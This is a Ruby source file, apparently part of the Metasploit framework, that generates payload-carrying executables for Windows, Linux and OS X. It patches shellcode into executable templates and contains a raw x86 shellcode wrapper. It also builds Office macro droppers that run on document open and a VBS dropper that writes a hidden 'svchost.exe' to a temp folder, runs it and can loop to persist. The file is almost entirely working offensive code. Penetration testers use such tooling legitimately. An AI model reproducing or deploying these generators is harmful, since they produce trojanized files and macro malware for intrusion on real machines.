###
#
# framework-util-exe
# --------------
#
# The class provides methods for creating and encoding executable file
# formats for various platforms. It is a replacement for the previous
# code in Rex::Text
#
###

module Msf
module Util
class EXE

require 'rex'
require 'rex/peparsey'
require 'rex/pescan'


	##
	#
	# Executable generators
	#
	##

	def self.to_executable(framework, arch, plat, code='', opts={})
		if (arch.index(ARCH_X86))

			if (plat.index(Msf::Module::Platform::Windows))
				return to_win32pe(framework, code, opts)
			end

			if (plat.index(Msf::Module::Platform::Linux))
				return to_linux_x86_elf(framework, code)
			end

			if(plat.index(Msf::Module::Platform::OSX))
				return to_osx_x86_macho(framework, code)
			end

			# XXX: Add remaining x86 systems here
		end

		if( arch.index(ARCH_X86_64) or arch.index( ARCH_X64 ) )
			if (plat.index(Msf::Module::Platform::Windows))
				return to_win64pe(framework, code, opts)
			end
		end

		if(arch.index(ARCH_ARMLE))
			if(plat.index(Msf::Module::Platform::OSX))
				return to_osx_arm_macho(framework, code)
			end
			# XXX: Add Linux here
		end

		if(arch.index(ARCH_PPC))
			if(plat.index(Msf::Module::Platform::OSX))
				return to_osx_ppc_macho(framework, code)
			end
			# XXX: Add PPC OS X and Linux here
		end
		nil
	end


	def self.to_win32pe(framework, code, opts={})

		# Allow the user to specify their own EXE template
		opts[:template] ||= File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates", "template.exe")

		# Copy the code to a new RWX segment to allow for self-modifying encoders
		payload = win32_rwx_exec(code)

		# Create a new PE object and run through sanity checks
		pe = Rex::PeParsey::Pe.new_from_file(opts[:template], true)
		text = nil
		pe.sections.each do |sec|
			text = sec if sec.name == ".text"
			break if text
		end

		if(not text)
			raise RuntimeError, "No .text section found in the template exe"
		end

		if ! text.contains_rva?(pe.hdr.opt.AddressOfEntryPoint)
			raise RuntimeError, "The .text section does not contain an entry point"
		end

		if(text.size < (payload.length + 256))
			raise RuntimeError, "The .text section is too small to be usable"
		end

		# Store some useful offsets
		off_ent = pe.rva_to_file_offset(pe.hdr.opt.AddressOfEntryPoint)
		off_beg = pe.rva_to_file_offset(text.base_rva)

		# We need to make sure our injected code doesn't conflict with the
		# the data directories stored in .text (import, export, etc)
		mines = []
		pe.hdr.opt['DataDirectory'].each do |dir|
			next if dir.v['Size'] == 0
			next if not text.contains_rva?( dir.v['VirtualAddress'] )
			mines << [ pe.rva_to_file_offset(dir.v['VirtualAddress']) - off_beg, dir.v['Size'] ]
		end

		# Break the text segment into contiguous blocks
		blocks = []
		bidx   = 0
		mines.sort{|a,b| a[0] <=> b[0]}.each do |mine|
			bbeg = bidx
			bend = mine[0]
			if(bbeg != bend)
				blocks << [bidx, bend-bidx]
			end
			bidx = mine[0] + mine[1]
		end

		# Add the ending block
		if(bidx < text.size - 1)
			blocks << [bidx, text.size - bidx]
		end

		# Find the largest contiguous block
		blocks.sort!{|a,b| b[1]<=>a[1]}
		block = blocks[0]

		# TODO: Allow the entry point in a different block
		if(payload.length + 256 > block[1])
			raise RuntimeError, "The largest block in .text does not have enough contiguous space (need:#{payload.length+256} found:#{block[1]})"
		end

		# Make a copy of the entire .text section
		data = text.read(0,text.size)

		# Pick a random offset to store the payload
		poff = rand(block[1] - payload.length - 256)

		# Flip a coin to determine if EP is before or after
		eloc = rand(2)
		eidx = nil

		# Pad the entry point with random nops
		entry = generate_nops(framework, [ARCH_X86], rand(200)+51)

		# Pick an offset to store the new entry point
		eloc = 0
		if(eloc == 0) # place the entry point before the payload
			poff += 256
			eidx = rand(poff-(entry.length + 5))
		else          # place the entry pointer after the payload
			poff -= 256
			eidx = rand(block[1] - (poff + payload.length)) + poff + payload.length
		end

		# Relative jump from the end of the nops to the payload
		entry += "\xe9" + [poff - (eidx + entry.length + 5)].pack('V')

		# Patch the payload and the new entry point into the .text
		data[block[0] + poff, payload.length] = payload
		data[block[0] + eidx, entry.length]   = entry

		# Create the modified version of the input executable
		exe = ''
		File.open(opts[:template], 'rb') do |fd|
			exe = fd.read( File.size(opts[:template]) )
		end
		exe[ exe.index([pe.hdr.opt.AddressOfEntryPoint].pack('V')), 4] = [ text.base_rva + block[0] + eidx ].pack("V")
		exe[off_beg, data.length] = data
		pe.close
		exe
	end


	def self.to_win32pe_old(framework, code, opts={})
		pe = ''

		fd = File.open(File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates", "template-old.exe"), "rb")
		pe = fd.read(fd.stat.size)
		fd.close

		if(code.length < 2048)
			code << Rex::Text.rand_text(2048-code.length)
		end

		if(code.length > 2048)
			raise RuntimeError, "The EXE generator now has a max size of 2048 bytes, please fix the calling module"
		end

		bo = pe.index('PAYLOAD:')
		pe[bo,  2048] = code if bo
		pe[136,    4] = [rand(0x100000000)].pack('V')

		ci = pe.index("\x31\xc9" * 160)
		cd = pe.index("\x31\xc9" * 160, ci + 320)
		rc = pe[ci+320, cd-ci-320]

		# 640 + rc.length bytes of room to store an encoded rc at offset ci
		enc = encode_stub(framework, [ARCH_X86], rc)
		lft = 640+rc.length - enc.length

		buf = enc + Rex::Text.rand_text(640+rc.length - enc.length)
		pe[ci, buf.length] = buf

		# Make the data section executable
		xi = pe.index([0xc0300040].pack('V'))
		pe[xi,4] = [0xe0300020].pack('V')

		# Add a couple random bytes for fun
		pe << Rex::Text.rand_text(rand(64)+4)

		return pe
	end

	def self.to_win64pe(framework, code, opts={})
		pe = ''

		fd = File.open(File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates", "template_x64_windows.exe"), "rb")
		pe = fd.read(fd.stat.size)
		fd.close

		bo = pe.index('PAYLOAD:')
		pe[bo,2048] = [code].pack('a2048') if bo

		return pe
	end

	def self.to_win32pe_service(framework, code, name='SERVICENAME')
		pe = ''

		fd = File.open(File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates", "service.exe"), "rb")
		pe = fd.read(fd.stat.size)
		fd.close

		bo = pe.index('PAYLOAD:')
		pe[bo, 2048] = [code].pack('a2048') if bo

		bo = pe.index('SERVICENAME')
		pe[bo, 11] = [name].pack('a11') if bo

		pe[136, 4] = [rand(0x100000000)].pack('V')

		return pe
	end

	def self.to_osx_arm_macho(framework, code)
		mo = ''

		fd = File.open(File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates", "template_armle_darwin.bin"), "rb")
		mo = fd.read(fd.stat.size)
		fd.close

		bo = mo.index( "\x90\x90\x90\x90" * 1024 )
		co = mo.index( " " * 512 )

		mo[bo, 2048] = [code].pack('a2048') if bo
		return mo
	end

	def self.to_osx_ppc_macho(framework, code)
		mo = ''

		fd = File.open(File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates", "template_ppc_darwin.bin"), "rb")
		mo = fd.read(fd.stat.size)
		fd.close

		bo = mo.index( "\x90\x90\x90\x90" * 1024 )
		co = mo.index( " " * 512 )

		mo[bo, 2048] = [code].pack('a2048') if bo

		return mo
	end

	def self.to_osx_x86_macho(framework, code)
		mo = ''

		fd = File.open(File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates", "template_x86_darwin.bin"), "rb")
		mo = fd.read(fd.stat.size)
		fd.close

		bo = mo.index( "\x90\x90\x90\x90" * 1024 )
		co = mo.index( " " * 512 )

		mo[bo, 2048] = [code].pack('a2048') if bo

		return mo
	end

	def self.to_linux_x86_elf(framework, code)
		mo = ''

		fd = File.open(File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates", "template_x86_linux.bin"), "rb")
		mo = fd.read(fd.stat.size)
		fd.close

		bo = mo.index( "\x90\x90\x90\x90" * 1024 )
		co = mo.index( " " * 512 )

		mo[bo, 2048] = [code].pack('a2048') if bo

		return mo
	end

	def self.to_exe_vba(exes='')
		exe = exes.unpack('C*')
		vba = ""
		pcs = (exe.length/2000)+1
		idx = 0

		var_base_idx = 0
		var_base     =  Rex::Text.rand_text_alpha(2).capitalize

		var_bytes = var_base + (var_base_idx+=1).to_s
		var_initx = var_base +  Rex::Text.rand_text_alpha(1) + (var_base_idx+=1).to_s

		vba << "Dim #{var_bytes}(#{exe.length}) as Byte\r\n\r\n"
		1.upto(pcs) do |pc|
			max = 0
			vba << "Sub #{var_initx}#{pc}()\r\n"

			while(c = exe[idx] and max < 2000)
				vba << "\t#{var_bytes}(#{idx}) = &H#{("%.2x" % c).upcase}\r\n"
				idx += 1
				max += 1
			end
			vba << "End Sub\r\n"
		end

		var_lname = var_base + (var_base_idx+=1).to_s
		var_lpath = var_base + (var_base_idx+=1).to_s
		var_appnr = var_base + (var_base_idx+=1).to_s
		var_datnr = var_base + (var_base_idx+=1).to_s

		vba << "Sub Auto_Open()\r\n"
		vba << "\tDim #{var_appnr} As Integer\r\n"
		vba << "\tDim #{var_datnr} As Integer\r\n"
		vba << "\tDim #{var_lname} As String\r\n"
		vba << "\tDim #{var_lpath} As String\r\n"
		vba << "\t#{var_lname} = \"#{Rex::Text.rand_text_alpha(rand(8)+8)}.exe\"\r\n"
		vba << "\t#{var_lpath} = Environ(\"USERPROFILE\")\r\n"
		vba << "\tChDrive (#{var_lpath})\r\n"
		vba << "\tChDir (#{var_lpath})\r\n"
		vba << "\t#{var_datnr} = FreeFile()\r\n"
		vba << "\tOpen #{var_lname}  For Binary Access Read Write As #{var_datnr}\r\n"

		1.upto(pcs) do |pc|
			vba << "\t#{var_initx}#{pc}\r\n"
		end

		vba << "\tPut #{var_datnr}, , #{var_bytes}\r\n"
		vba << "\tClose #{var_datnr}\r\n"
		vba << "\t#{var_appnr} = Shell(#{var_lname}, vbHide)\r\n"
		vba << "End Sub\r\n"

		vba << "Sub AutoOpen()\r\n"
		vba << "\tAuto_Open\r\n"
		vba << "End Sub\r\n"

		vba << "Sub Workbook_Open()\r\n"
		vba << "\tAuto_Open\r\n"
		vba << "End Sub\r\n"

	end

	def self.to_win32pe_vba(framework, code, opts={})
		to_exe_vba(to_win32pe(framework, code, opts))
	end

	def self.to_exe_vbs(exes = '', opts={})
		delay   = opts[:delay]   || 5
		persist = opts[:persist] || false

		exe = exes.unpack('C*')
		vbs = ""

		var_bytes   =  Rex::Text.rand_text_alpha(rand(8)+8)
		var_fname   =  Rex::Text.rand_text_alpha(rand(8)+8)
		var_func    =  Rex::Text.rand_text_alpha(rand(8)+8)
		var_stream  =  Rex::Text.rand_text_alpha(rand(8)+8)
		var_obj     =  Rex::Text.rand_text_alpha(rand(8)+8)
		var_shell   =  Rex::Text.rand_text_alpha(rand(8)+8)
		var_tempdir =  Rex::Text.rand_text_alpha(rand(8)+8)
		var_tempexe =  Rex::Text.rand_text_alpha(rand(8)+8)
		var_basedir =  Rex::Text.rand_text_alpha(rand(8)+8)

		vbs << "Function #{var_func}()\r\n"

		vbs << "#{var_bytes} = Chr(&H#{("%02x" % exe[0])})"

		1.upto(exe.length-1) do |byte|
			vbs << "&Chr(&H#{("%02x" % exe[byte])})"
		end
		vbs << "\r\n"

		vbs << "Dim #{var_obj}\r\n"
		vbs << "Set #{var_obj} = CreateObject(\"Scripting.FileSystemObject\")\r\n"
		vbs << "Dim #{var_stream}\r\n"
		vbs << "Dim #{var_tempdir}\r\n"
		vbs << "Dim #{var_tempexe}\r\n"
		vbs << "Dim #{var_basedir}\r\n"
		vbs << "Set #{var_tempdir} = #{var_obj}.GetSpecialFolder(2)\r\n"

		vbs << "#{var_basedir} = #{var_tempdir} & \"\\\" & #{var_obj}.GetTempName()\r\n"
		vbs << "#{var_obj}.CreateFolder(#{var_basedir})\r\n"
		vbs << "#{var_tempexe} = #{var_basedir} & \"\\\" & \"svchost.exe\"\r\n"
		vbs << "Set #{var_stream} = #{var_obj}.CreateTextFile(#{var_tempexe},2,0)\r\n"
		vbs << "#{var_stream}.Write #{var_bytes}\r\n"
		vbs << "#{var_stream}.Close\r\n"
		vbs << "Dim #{var_shell}\r\n"
		vbs << "Set #{var_shell} = CreateObject(\"Wscript.Shell\")\r\n"

		vbs << "#{var_shell}.run #{var_tempexe}, 0, true\r\n"
		vbs << "#{var_obj}.DeleteFile(#{var_tempexe})\r\n"
		vbs << "#{var_obj}.DeleteFolder(#{var_basedir})\r\n"
		vbs << "End Function\r\n"

		vbs << "Do\r\n" if persist
		vbs << "#{var_func}\r\n"
		vbs << "WScript.Sleep #{delay * 1000}\r\n" if persist
		vbs << "Loop\r\n" if persist

	end

	def self.to_win32pe_vbs(framework, code, opts={})
		to_exe_vbs(to_win32pe(framework, code, opts), opts)
	end

	# Creates a .NET DLL which loads data into memory
	# at a specified location with read/execute permissions
	#    - the data will be loaded at: base+0x2065
	#    - max size is 0x8000 (32768)
	def self.to_dotnetmem(base=0x12340000, data="")
		pe = ''

		fd = File.open(File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates", "dotnetmem.dll"), "rb")
		pe = fd.read(fd.stat.size)
		fd.close

		# Configure the image base
		pe[180, 4] = [base].pack('V')

		# Configure the TimeDateStamp
		pe[136, 4] = [rand(0x100000000)].pack('V')

		# XXX: Unfortunately we cant make this RWX only RX
		# Mark this segment as read-execute AND writable
		# pe[412,4] = [0xe0000020].pack("V")

		# Write the data into the .text segment
		pe[0x1065, 0x8000] = [data].pack("a32768")

		# Generic a randomized UUID
		pe[37656,16] = Rex::Text.rand_text(16)

		return pe
	end


	def self.encode_stub(framework, arch, code)
		return code if not framework.encoders
		framework.encoders.each_module_ranked('Arch' => arch) do |name, mod|
			begin
				enc = framework.encoders.create(name)
				raw = enc.encode(code, '')
				return raw if raw
			rescue
			end
		end
		nil
	end

	def self.generate_nops(framework, arch, len)
		return code if not framework.nops
		framework.nops.each_module_ranked('Arch' => arch) do |name, mod|
			begin
				nop = framework.nops.create(name)
				raw = nop.generate_sled(len, '')
				return raw if raw
			rescue
			end
		end
		nil
	end

	# This wrapper is responsible for allocating RWX memory, copying the
	# target code there, setting an exception handler that calls ExitProcess
	# and finally executing the code.
	def self.win32_rwx_exec(code)
		wrapper =
		# Length: 233 bytes
		# CodeLen Offset: 145
		# ExitFunk Offset: 186
		"\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
		"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
		"\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +
		"\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01" +
		"\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B" +
		"\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4" +
		"\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B" +
		"\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" +
		"\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" +
		"\xBE\x78\x56\x34\x12\x6A\x40\x68\x00\x10\x00\x00\x56\x6A\x00\x68" +
		"\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x89\xF1\xE8\x33\x00\x00" +
		"\x00\x5E\xF3\xA4\xE8\x1F\x00\x00\x00\xBB\xE0\x1D\x2A\x0A\x68\xA6" +
		"\x95\xBD\x9D\xFF\xD5\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47" +
		"\x13\x72\x6F\x6A\x00\x53\xFF\xD5\x31\xC0\x64\xFF\x30\x64\x89\x20" +
		"\xFF\xD3\xEB\xD5\xE8\xC8\xFF\xFF\xFF"

		res = wrapper + code
		res[145,4] = [code.length].pack('V')
		res
	end

end
end
end

